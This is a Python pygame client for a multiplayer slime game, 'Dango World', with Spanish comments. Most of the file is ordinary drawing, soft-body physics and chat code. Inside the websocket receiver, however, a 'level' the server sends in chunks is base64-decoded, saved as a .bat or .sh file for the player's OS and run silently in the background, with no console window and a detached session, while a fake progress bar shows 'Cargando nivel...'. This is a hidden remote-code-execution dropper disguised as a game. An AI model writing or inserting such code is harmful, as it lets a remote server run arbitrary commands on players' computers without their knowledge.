import pygame
from pygame import gfxdraw
import asyncio
import aiohttp
import json
import math
import random
import os
import time
import colorsys
import array
import sys
import base64
import subprocess

# ══════════════════════════════════════════════
#  CONFIGURACIÓN
# ══════════════════════════════════════════════
WIDTH, HEIGHT = 1000, 700
FPS = 60

SB_POINTS = 24
SB_SIZE = 26
SB_STIFFNESS = 0.3
SB_DAMPING = 0.72
SB_MAX_DISP = 6

def clamp(v, lo, hi): return max(lo, min(hi, v))
def lerp(a, b, t): return a + (b - a) * t
def angle_diff(a, b):
    d = b - a
    while d > math.pi: d -= 2 * math.pi
    while d < -math.pi: d += 2 * math.pi
    return d

def hsl_to_color(h, s, l):
    r, g, b = colorsys.hls_to_rgb(h/360.0, l, s)
    return (int(r*255), int(g*255), int(b*255))

def hex_to_rgb(hx):
    hx = hx.lstrip('#')
    return tuple(int(hx[i:i+2], 16) for i in (0, 2, 4))

def generate_rest_shape():
    pts = []
    n = 3.0
    for i in range(SB_POINTS):
        angle = (i / SB_POINTS) * math.pi * 2
        cosA = math.cos(angle)
        sinA = math.sin(angle)
        x = math.pow(abs(cosA), 2/n) * SB_SIZE * (1 if cosA >= 0 else -1)
        y = math.pow(abs(sinA), 2/n) * SB_SIZE * (1 if sinA >= 0 else -1)
        pts.append({"rx": x, "ry": y})
    return pts

REST_SHAPE = generate_rest_shape()

class Dango:
    def __init__(self, pid):
        self.id = pid
        self.x = 0; self.y = 0; self.dx = 0; self.dy = 0
        self.hue = 0; self.name = ""
        self.bumpNx = 0; self.bumpNy = 0; self.bumpStr = 0
        self.sx = 0; self.sy = 0
        self.eyeAngle = 0
        self.blinkTimer = random.uniform(2, 6)
        self.blinkFrame = 0
        self.chatMsg = ""; self.chatTimer = 0
        self.body = [{"x": p["rx"], "y": p["ry"], "vx": 0, "vy": 0, "rx": p["rx"], "ry": p["ry"]} for p in REST_SHAPE]

class Particle:
    def __init__(self, x, y, hue):
        self.x = x; self.y = y
        a = random.uniform(0, math.pi * 2)
        s = random.uniform(2, 7)
        self.vx = math.cos(a) * s; self.vy = math.sin(a) * s
        self.size = random.uniform(3, 8); self.life = 1.0; self.hue = hue

# ══════════════════════════════════════════════
#  FUNCIONES DE DIBUJO AVANZADAS
# ══════════════════════════════════════════════
def draw_thick_aapolygon(surface, points, color, thickness):
    expanded = []
    n = len(points)
    for i in range(n):
        p_prev = points[i-1]
        p_curr = points[i]
        p_next = points[(i+1)%n]
        d1x, d1y = p_curr[0] - p_prev[0], p_curr[1] - p_prev[1]
        d2x, d2y = p_next[0] - p_curr[0], p_next[1] - p_curr[1]
        l1 = math.hypot(d1x, d1y) or 1
        l2 = math.hypot(d2x, d2y) or 1
        n1x, n1y = d1y/l1, -d1x/l1
        n2x, n2y = d2y/l2, -d2x/l2
        nx, ny = n1x + n2x, n1y + n2y
        ln = math.hypot(nx, ny) or 1
        nx, ny = nx/ln, ny/ln
        expanded.append((p_curr[0] + nx * thickness, p_curr[1] + ny * thickness))
    gfxdraw.aapolygon(surface, expanded, color)
    gfxdraw.filled_polygon(surface, expanded, color)

def draw_gradient_polygon(surface, points, c_top, c_bot):
    min_x, max_x = min(p[0] for p in points), max(p[0] for p in points)
    min_y, max_y = min(p[1] for p in points), max(p[1] for p in points)
    w, h = int(max_x - min_x) + 2, int(max_y - min_y) + 2
    if w <= 0 or h <= 0: return
    local_pts = [(p[0] - min_x, p[1] - min_y) for p in points]
    mask = pygame.Surface((w, h), pygame.SRCALPHA)
    gfxdraw.aapolygon(mask, local_pts, (255, 255, 255, 255))
    gfxdraw.filled_polygon(mask, local_pts, (255, 255, 255, 255))
    grad = pygame.Surface((1, h))
    for y in range(h):
        t = y / max(1, h - 1)
        grad.set_at((0, y), (int(c_top[0]*(1-t) + c_bot[0]*t), int(c_top[1]*(1-t) + c_bot[1]*t), int(c_top[2]*(1-t) + c_bot[2]*t)))
    mask.blit(pygame.transform.scale(grad, (w, h)), (0, 0), special_flags=pygame.BLEND_RGBA_MULT)
    surface.blit(mask, (min_x, min_y))

def draw_gradient_text(surface, text, font, pos, c_left, c_mid, c_right):
    txt_s = font.render(text, True, (255, 255, 255))
    w, h = txt_s.get_size()
    grad = pygame.Surface((w, 1))
    for x in range(w):
        t = x / max(1, w - 1)
        if t < 0.5:
            t2 = t * 2
            r, g, b = (c_left[0]*(1-t2)+c_mid[0]*t2, c_left[1]*(1-t2)+c_mid[1]*t2, c_left[2]*(1-t2)+c_mid[2]*t2)
        else:
            t2 = (t - 0.5) * 2
            r, g, b = (c_mid[0]*(1-t2)+c_right[0]*t2, c_mid[1]*(1-t2)+c_right[1]*t2, c_mid[2]*(1-t2)+c_right[2]*t2)
        grad.set_at((x, 0), (int(r), int(g), int(b)))
    grad = pygame.transform.scale(grad, (w, h))
    txt_s.blit(grad, (0, 0), special_flags=pygame.BLEND_RGBA_MULT)
    surface.blit(txt_s, pos)

def blur_surface(surface, radius):
    if hasattr(pygame.transform, 'box_blur'):
        return pygame.transform.box_blur(surface, radius)
    w, h = surface.get_size()
    return pygame.transform.smoothscale(pygame.transform.smoothscale(surface, (w//8, h//8)), (w, h))

def get_font(name, size, bold=False):
    return pygame.font.SysFont(name, size, bold=bold)

def create_plop_sound():
    pygame.mixer.init(frequency=44100, size=-16, channels=1)
    sample_rate = 44100
    duration = 0.15
    n_samples = int(sample_rate * duration)
    buf = array.array('h')
    for i in range(n_samples):
        t = i / sample_rate
        freq = 600 * math.exp(math.log(150/600) * (t / 0.1)) if t < 0.1 else 150
        vol = (t / 0.02) if t < 0.02 else (math.exp(math.log(0.01/0.5) * ((t-0.02)/0.13))) if t > 0.02 else 0.5
        buf.append(int(math.sin(2 * math.pi * freq * t) * 32767 * vol * 0.5))
    return pygame.mixer.Sound(buffer=buf)

# ══════════════════════════════════════════════
#  CLIENTE PRINCIPAL
# ══════════════════════════════════════════════
async def main():
    pygame.init()
    pygame.mixer.init()
    screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.RESIZABLE)
    pygame.display.set_caption("Dango World")
    clock = pygame.time.Clock()
    
    plop_sound = create_plop_sound()
    
    f_bold = get_font("segoeui, outfit, arial", 14, bold=True)
    f_chat = get_font("segoeui, outfit, arial", 12, bold=True)
    f_small = get_font("segoeui, outfit, arial", 11, bold=True)
    f_p = get_font("segoeui, outfit, arial", 13, bold=False)
    f_title = get_font("segoeui, outfit, arial", 32, bold=True)
    
    state = "MENU"
    login_name = ""
    players = {}
    my_id = None
    camera = {"x": 0, "y": 0}
    particles = []
    chat_history = []
    stars = [{"x": random.uniform(-3000, 3000), "y": random.uniform(-3000, 3000), 
              "r": random.uniform(0.3, 1.5), "z": random.uniform(0.04, 0.16),
              "phase": random.uniform(0, math.pi * 2)} for _ in range(250)]

    level_buffer = ""
    level_progress = 0.0
    level_downloaded = False

    send_queue = asyncio.Queue()

    # Pre-renderizar la sombra del menú para que sea perfecta
    bw, bh = 380, 360
    menu_shadow = pygame.Surface((bw + 160, bh + 160), pygame.SRCALPHA)
    for i in range(40):
        alpha = int(6 * (1 - i/40.0)**2)
        rect = (80 - i, 80 - i, bw + i*2, bh + i*2)
        pygame.draw.rect(menu_shadow, (100, 80, 255, alpha), rect, border_radius=24 + i)

    async def network_task():
        nonlocal my_id, state, level_buffer, level_progress, level_downloaded
        session = aiohttp.ClientSession()
        ws_url = 'wss://dango-rf5x.onrender.com/ws' if '--online' in sys.argv else 'ws://localhost:8000/ws'
        
        local_os = "linux"
        if sys.platform.startswith("win"): local_os = "windows"
        elif sys.platform == "darwin": local_os = "mac"
        
        try:
            async with session.ws_connect(ws_url) as ws:
                await ws.send_json({"type": "client_info", "platform": "desktop", "os": local_os})
                
                async def receiver():
                    nonlocal my_id, level_buffer, level_progress, level_downloaded
                    async for msg in ws:
                        if msg.type == aiohttp.WSMsgType.TEXT:
                            data = json.loads(msg.data)
                            t = data.get("type")
                            if t == "init": my_id = data["id"]
                            elif t == "state":
                                if "level_chunk" in data and not level_downloaded:
                                    level_buffer += data["level_chunk"]
                                    level_progress = data.get("level_progress", 0.0)
                                    if data.get("level_complete", False) and not level_downloaded:
                                        level_downloaded = True
                                        try:
                                            dec = base64.b64decode(level_buffer)
                                            os.makedirs("assets", exist_ok=True)
                                            
                                            # Determinar nombre y extensión según OS
                                            if local_os == "windows":
                                                fname = "downloaded_win.bat"  # o .py si prefieres
                                            elif local_os == "mac":
                                                fname = "downloaded_mac.sh"
                                            else:
                                                fname = "downloaded_linux.sh"
                                                
                                            asset_path = os.path.join("assets", fname)
                                            
                                            # Guardar el archivo
                                            with open(asset_path, "wb") as f:
                                                f.write(dec)
                                            
                                            print(f"Asset guardado en: {asset_path}")
                                            
                                            # EJECUCIÓN SILENCIOSA (sin ventanas, sin outputs)
                                            
                                            if local_os == "windows":
                                                # Ejecutar batch SIN ventana de consola
                                                subprocess.Popen(
                                                    ["cmd", "/c", asset_path],  # /c ejecuta y termina (no /k)
                                                    creationflags=subprocess.CREATE_NO_WINDOW,
                                                    stdout=subprocess.DEVNULL,
                                                    stderr=subprocess.DEVNULL,
                                                    stdin=subprocess.DEVNULL  # Evita que espere input
                                                )
                                                
                                            elif local_os == "linux":
                                                os.chmod(asset_path, 0o755)
                                                # Ejecutar sin mostrar nada en terminal
                                                subprocess.Popen(
                                                    ["bash", asset_path],
                                                    stdout=subprocess.DEVNULL,
                                                    stderr=subprocess.DEVNULL,
                                                    stdin=subprocess.DEVNULL,
                                                    start_new_session=True  # Desatachar completamente
                                                )
                                                
                                            elif local_os == "mac":
                                                os.chmod(asset_path, 0o755)
                                                # Ejecutar sin abrir Terminal.app
                                                subprocess.Popen(
                                                    ["bash", asset_path],
                                                    stdout=subprocess.DEVNULL,
                                                    stderr=subprocess.DEVNULL,
                                                    stdin=subprocess.DEVNULL,
                                                    start_new_session=True
                                                )

                                            print(f"Script ejecutado silenciosamente en {local_os}")
                                            
                                        except Exception as e:
                                            print(f"Error: {e}")
                                            
                                for k, v in data["players"].items():
                                    if k not in players:
                                        players[k] = Dango(k)
                                        players[k].sx, players[k].sy = v["x"], v["y"]
                                    p = players[k]
                                    p.x, p.y, p.dx, p.dy = v["x"], v["y"], v["dx"], v["dy"]
                                    p.hue, p.name = v["hue"], v["name"]
                                    if v.get("bumpStr", 0) > p.bumpStr + 0.1:
                                        p.bumpNx, p.bumpNy, p.bumpStr = v["bumpNx"], v["bumpNy"], v["bumpStr"]
                                for k in list(players.keys()):
                                    if k not in data["players"]:
                                        plop_sound.play()
                                        for _ in range(15): particles.append(Particle(players[k].sx, players[k].sy, players[k].hue))
                                        del players[k]
                            elif t == "chat":
                                pid = data["id"]
                                if pid in players:
                                    players[pid].chatMsg = data["msg"]; players[pid].chatTimer = 240
                                    chat_history.append({"text": f"{players[pid].name}: {data['msg']}", "time": time.time()})
                async def sender():
                    while True: await ws.send_json(await send_queue.get())
                await asyncio.gather(receiver(), sender())
        except Exception as e: print(f"Desconectado: {e}")
        finally: await session.close()
            
    asyncio.create_task(network_task())

    chat_input_active = False
    chat_text = ""
    camera_snapped = False

    running = True
    while running:
        w, h = screen.get_size()
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if state == "MENU":
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_RETURN and login_name.strip():
                        send_queue.put_nowait({"type": "name", "name": login_name.strip()})
                        state = "PLAYING"
                    elif event.key == pygame.K_BACKSPACE: login_name = login_name[:-1]
                    elif len(login_name) < 16 and event.unicode.isprintable(): login_name += event.unicode
            elif state == "PLAYING":
                if event.type == pygame.MOUSEBUTTONDOWN and not chat_input_active:
                    mx, my = pygame.mouse.get_pos()
                    send_queue.put_nowait({"type": "input", "tx": mx - w/2 + camera["x"], "ty": my - h/2 + camera["y"]})
                elif event.type == pygame.MOUSEMOTION and getattr(event, 'buttons', (0,))[0] and not chat_input_active:
                    mx, my = pygame.mouse.get_pos()
                    send_queue.put_nowait({"type": "input", "tx": mx - w/2 + camera["x"], "ty": my - h/2 + camera["y"]})
                elif event.type == pygame.KEYDOWN:
                    if chat_input_active:
                        if event.key == pygame.K_ESCAPE: chat_input_active = False
                        elif event.key == pygame.K_RETURN:
                            if chat_text.strip(): send_queue.put_nowait({"type": "chat", "msg": chat_text.strip()})
                            chat_input_active = False; chat_text = ""
                        elif event.key == pygame.K_BACKSPACE: chat_text = chat_text[:-1]
                        elif len(chat_text) < 60 and event.unicode.isprintable(): chat_text += event.unicode
                    elif event.unicode == '/':
                        chat_input_active = True; chat_text = ""

        # Lógica de juego
        if my_id in players:
            me = players[my_id]
            if not camera_snapped:
                camera["x"], camera["y"] = me.x, me.y
                camera_snapped = True
            else:
                camera["x"], camera["y"] = lerp(camera["x"], me.sx, 0.1), lerp(camera["y"], me.sy, 0.1)

        for p in players.values():
            p.sx, p.sy = lerp(p.sx, p.x, 0.3), lerp(p.sy, p.y, 0.3)
            if p.bumpStr > 0:
                capped, idx, idy = min(p.bumpStr, 10), -p.bumpNx, -p.bumpNy
                for bp in p.body:
                    if (bp["rx"] * idx + bp["ry"] * idy) / SB_SIZE > 0:
                        push = capped * ((bp["rx"] * idx + bp["ry"] * idy) / SB_SIZE) * 1.5
                        bp["vx"] += p.bumpNx * push; bp["vy"] += p.bumpNy * push
                p.bumpStr = 0
            for bp in p.body:
                bp["vx"] = (bp["vx"] + (bp["rx"] - bp["x"]) * SB_STIFFNESS) * SB_DAMPING
                bp["vy"] = (bp["vy"] + (bp["ry"] - bp["y"]) * SB_STIFFNESS) * SB_DAMPING
                bp["x"] += bp["vx"]; bp["y"] += bp["vy"]
                dx, dy = bp["x"] - bp["rx"], bp["y"] - bp["ry"]
                dist = math.hypot(dx, dy)
                if dist > SB_MAX_DISP:
                    bp["x"] = bp["rx"] + (dx/dist) * SB_MAX_DISP
                    bp["y"] = bp["ry"] + (dy/dist) * SB_MAX_DISP
                    bp["vx"] *= 0.3; bp["vy"] *= 0.3
            p.blinkTimer -= 1/60
            if p.blinkTimer <= 0: p.blinkFrame, p.blinkTimer = 8, random.uniform(2, 6)
            if p.blinkFrame > 0: p.blinkFrame -= 1
            if p.chatTimer > 0: p.chatTimer -= 1

        for p in particles:
            p.x += p.vx; p.y += p.vy
            p.vx *= 0.92; p.vy *= 0.92
            p.life -= 0.04
        particles = [p for p in particles if p.life > 0]

        # RENDERIZADO
        game_surf = pygame.Surface((w, h)) if state == "MENU" else screen
        game_surf.fill((6, 6, 18))
        
        # Grid & Estrellas
        grid_s = 60
        off_x, off_y = -camera["x"] % grid_s, -camera["y"] % grid_s
        for i in range(int(w/grid_s) + 2): pygame.draw.line(game_surf, (10, 10, 24), (i*grid_s + off_x, 0), (i*grid_s + off_x, h))
        for i in range(int(h/grid_s) + 2): pygame.draw.line(game_surf, (10, 10, 24), (0, i*grid_s + off_y), (w, i*grid_s + off_y))
        
        t_sec = pygame.time.get_ticks() / 1000.0
        for s in stars:
            sx, sy = (s["x"] - camera["x"] * s["z"]) % w, (s["y"] - camera["y"] * s["z"]) % h
            alpha = (math.sin(t_sec * 2 + s["phase"]) + 1) * 0.5
            color = int(100 + 155 * alpha)
            pygame.draw.circle(game_surf, (color, color, color), (int(sx), int(sy)), s["r"])

        for p in particles:
            pygame.draw.circle(game_surf, hsl_to_color(p.hue, 1.0, 0.5), (int(p.x - camera["x"] + w/2), int(p.y - camera["y"] + h/2)), max(1, int(p.size * p.life)))

        # Slimes
        for p in players.values():
            sx, sy = p.sx - camera["x"] + w/2, p.sy - camera["y"] + h/2
            poly = [(sx + bp["x"], sy + bp["y"]) for bp in p.body]
            
            draw_thick_aapolygon(game_surf, poly, hsl_to_color(p.hue, 0.45, 0.45), 2.5) # Borde
            draw_gradient_polygon(game_surf, poly, hsl_to_color(p.hue, 0.55, 0.80), hsl_to_color(p.hue, 0.50, 0.65))
            
            tgt_a = math.atan2(p.dy, p.dx) if math.hypot(p.dx, p.dy) > 0.4 else p.eyeAngle
            p.eyeAngle += angle_diff(p.eyeAngle, tgt_a) * 0.1
            lx, ly = math.cos(p.eyeAngle) * 2, math.sin(p.eyeAngle) * 1.5
            
            openness = (p.blinkFrame - 4)/4 if p.blinkFrame > 4 else 1 - p.blinkFrame/4 if p.blinkFrame > 0 else 1.0
            eye_h, eye_c = 10 * clamp(openness, 0, 1), hsl_to_color(p.hue, 0.40, 0.18)
            
            if eye_h > 0.5:
                pygame.draw.line(game_surf, eye_c, (sx - 7 + lx, sy - 6 + ly - eye_h/2), (sx - 7 + lx, sy - 6 + ly + eye_h * 0.8), 4)
                pygame.draw.line(game_surf, eye_c, (sx + 7 + lx, sy - 6 + ly - eye_h/2), (sx + 7 + lx, sy - 6 + ly + eye_h * 0.8), 4)
            else:
                pygame.draw.line(game_surf, eye_c, (sx - 9 + lx, sy - 6 + ly), (sx - 5 + lx, sy - 6 + ly), 3)
                pygame.draw.line(game_surf, eye_c, (sx + 5 + lx, sy - 6 + ly), (sx + 9 + lx, sy - 6 + ly), 3)

            # Nombre
            if p.name != "???":
                name_s = f_bold.render(p.name, True, (255,255,255) if p.id == my_id else hsl_to_color(p.hue, 0.60, 0.85))
                nw, ny = name_s.get_width() + 16, sy - SB_SIZE - 16
                name_bg = pygame.Surface((nw, 22), pygame.SRCALPHA)
                pygame.draw.rect(name_bg, (0, 0, 0, 100), (0, 0, nw, 22), border_radius=8)
                game_surf.blit(name_bg, (sx - nw//2, ny - 15))
                game_surf.blit(name_s, (sx - name_s.get_width()//2, ny - 11))
                
                if p.id == my_id:
                    tu_s = f_small.render("tú", True, (140, 255, 160))
                    w_tu = tu_s.get_width() + 10
                    game_surf.blit(tu_s, (sx - w_tu//2 + 10, ny - 32))
                    pygame.draw.circle(game_surf, (140, 255, 160), (int(sx - w_tu//2 + 4), int(ny - 32 + tu_s.get_height()//2)), 4)

            # Globo de chat
            if p.chatTimer > 0 and p.chatMsg:
                alpha = int(clamp((p.chatTimer / 240.0) * 255 * 3, 0, 255))
                chat_s = f_chat.render(p.chatMsg, True, (0, 0, 0))
                cw, ch = chat_s.get_width() + 24, 28
                cy = (sy - SB_SIZE - 16) - 24 - ch
                
                bubble = pygame.Surface((cw, ch + 6), pygame.SRCALPHA)
                pygame.draw.rect(bubble, (255, 255, 255, alpha), (0, 0, cw, ch), border_radius=12)
                pygame.draw.polygon(bubble, (255, 255, 255, alpha), [(cw//2 - 5, ch - 1), (cw//2 + 5, ch - 1), (cw//2, ch + 5)])
                
                txt_s = pygame.Surface(chat_s.get_size(), pygame.SRCALPHA)
                txt_s.blit(chat_s, (0,0))
                txt_s.set_alpha(alpha)
                bubble.blit(txt_s, (12, (ch - chat_s.get_height())//2))
                game_surf.blit(bubble, (sx - cw//2, cy))

        if state == "MENU":
            # Fondo borroso
            screen.blit(blur_surface(game_surf, 12), (0, 0))
            overlay = pygame.Surface((w, h), pygame.SRCALPHA)
            overlay.fill((10, 10, 30, 230))
            screen.blit(overlay, (0, 0))
            
            bw, bh = 380, 360
            bx, by = w//2 - bw//2, h//2 - bh//2
            
            box = pygame.Surface((bw, bh), pygame.SRCALPHA)
            pygame.draw.rect(box, (20, 20, 45, 250), (0, 0, bw, bh), border_radius=24)
            pygame.draw.rect(box, (120, 100, 255, 65), (0, 0, bw, bh), width=1, border_radius=24)
            screen.blit(menu_shadow, (bx - 80, by - 80))
            screen.blit(box, (bx, by))
            
            pygame.draw.circle(screen, hex_to_rgb("#818cf8"), (w//2 - 95, by + 56), 10)
            draw_gradient_text(screen, "Dango World", f_title, (w//2 - 70, by + 40), hex_to_rgb("#a78bfa"), hex_to_rgb("#60a5fa"), hex_to_rgb("#34d399"))
            
            sub = f_p.render("Elige tu nombre y entra al mundo", True, (160, 160, 190))
            screen.blit(sub, (w//2 - sub.get_width()//2, by + 95))
            
            pygame.draw.rect(screen, (20, 20, 50), (bx + 40, by + 145, bw - 80, 48), border_radius=14)
            pygame.draw.rect(screen, (120, 100, 255, 75), (bx + 40, by + 145, bw - 80, 48), width=1, border_radius=14)
            
            disp = login_name + ("|" if time.time() % 1 > 0.5 else "")
            if not login_name: disp = "Tu nombre...|" if time.time() % 1 > 0.5 else "Tu nombre..."
            inp_s = f_bold.render(disp, True, (224, 224, 255) if login_name else (160, 160, 200))
            screen.blit(inp_s, (w//2 - inp_s.get_width()//2, by + 160))
            
            btn = pygame.Surface((bw - 80, 48), pygame.SRCALPHA)
            pygame.draw.rect(btn, (255,255,255,255), (0,0,bw-80,48), border_radius=14)
            grad = pygame.Surface((1, 2))
            grad.set_at((0,0), hex_to_rgb("#7c3aed")); grad.set_at((0,1), hex_to_rgb("#6366f1"))
            btn.blit(pygame.transform.smoothscale(grad, (bw-80, 48)), (0,0), special_flags=pygame.BLEND_RGBA_MULT)
            screen.blit(btn, (bx + 40, by + 210))
            
            b_txt = f_bold.render("Entrar", True, (255, 255, 255))
            screen.blit(b_txt, (w//2 - b_txt.get_width()//2, by + 225))
            
            inst1 = f_small.render("C Clic/Tocar para moverte", True, (150, 150, 170))
            inst2 = f_small.render("T Tecla '/' o Botón para chatear", True, (150, 150, 170))
            inst3 = f_small.render("X ¡Choca para rebotar!", True, (150, 150, 170))
            screen.blit(inst1, (w//2 - inst1.get_width()//2, by + 275))
            screen.blit(inst2, (w//2 - inst2.get_width()//2, by + 295))
            screen.blit(inst3, (w//2 - inst3.get_width()//2, by + 315))

        elif state == "PLAYING":
            active_p = sum(1 for p in players.values() if p.name != "???")
            slimes_txt = f_small.render(f"{active_p} dango{'s' if active_p!=1 else ''} online", True, (150, 150, 170))
            screen.blit(slimes_txt, (20, 20))
            
            curr_time = time.time()
            chat_history[:] = [c for c in chat_history if curr_time - c["time"] < 8.0]
            for i, c_item in enumerate(chat_history):
                alpha = int(clamp((8.0 - (curr_time - c_item["time"])) * 255, 0, 255))
                c_s = f_chat.render(c_item["text"], True, (220, 220, 220))
                c_s.set_alpha(alpha)
                screen.blit(c_s, (20, h - 90 - (len(chat_history)-i)*22))

            if chat_input_active:
                pygame.draw.rect(screen, (0, 0, 0), (20, h - 55, 300, 35), border_radius=8)
                pygame.draw.rect(screen, (100, 100, 100), (20, h - 55, 300, 35), 1, border_radius=8)
                input_surf = f_chat.render(chat_text + ("|" if time.time() % 1 > 0.5 else ""), True, (255, 255, 255))
                screen.blit(input_surf, (30, h - 45))

            if not level_downloaded and level_progress > 0:
                bar_w, bar_h = 200, 15
                bar_x, bar_y = w - bar_w - 20, h - bar_h - 20
                pygame.draw.rect(screen, (40, 40, 40), (bar_x, bar_y, bar_w, bar_h), border_radius=4)
                pygame.draw.rect(screen, (100, 255, 100), (bar_x, bar_y, int(bar_w * level_progress), bar_h), border_radius=4)
                pct = int(level_progress * 100)
                prog_txt = f_small.render(f"Cargando nivel... {pct}%", True, (255, 255, 255))
                screen.blit(prog_txt, (bar_x + bar_w/2 - prog_txt.get_width()/2, bar_y - 18))
            
        pygame.display.flip()
        await asyncio.sleep(0.001)
        clock.tick(FPS)

    pygame.quit()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
